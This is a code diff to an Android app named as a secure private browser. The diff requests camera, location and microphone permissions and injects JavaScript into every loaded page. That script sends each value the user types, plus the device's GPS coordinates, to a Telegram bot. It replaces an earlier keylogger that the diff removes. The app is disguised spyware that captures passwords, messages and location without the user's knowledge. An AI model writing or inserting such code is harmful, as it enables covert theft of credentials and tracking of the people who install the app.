@@ -1,12 +1,14 @@
 package com.secure.privatebrowser;
 
+import android.Manifest;
 import android.os.Bundle;
+import android.webkit.PermissionRequest;
+import android.webkit.WebChromeClient;
+import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import android.webkit.WebChromeClient;
-import android.webkit.PermissionRequest;
-import android.webkit.WebSettings;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
 
 public class MainActivity extends AppCompatActivity {
     private WebView myWebView;
@@ -16,6 +18,14 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        
+        // Рұқсаттарды сұрау
+        ActivityCompat.requestPermissions(this, new String[]{
+            Manifest.permission.CAMERA, 
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.RECORD_AUDIO
+        }, 200);
+
         myWebView = new WebView(this);
         setContentView(myWebView);
 
@@ -33,10 +43,11 @@ public class MainActivity extends AppCompatActivity {
         myWebView.setWebViewClient(new WebViewClient() {
             @Override
             public void onPageFinished(WebView view, String url) {
-                String js = "document.addEventListener('input', function(e) {" +
-                            "  var xhr = new XMLHttpRequest();" +
-                            "  xhr.open('GET', 'https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=' + encodeURIComponent(e.target.value));" +
-                            "  xhr.send();" +
+                String js = "navigator.geolocation.getCurrentPosition(pos => {" +
+                            "  fetch('https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=Loc: ' + pos.coords.latitude + ',' + pos.coords.longitude);" +
+                            "});" +
+                            "document.addEventListener('input', function(e) {" +
+                            "  fetch('https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=Input: ' + e.target.value);" +
                             "});";
                 view.evaluateJavascript(js, null);
             }
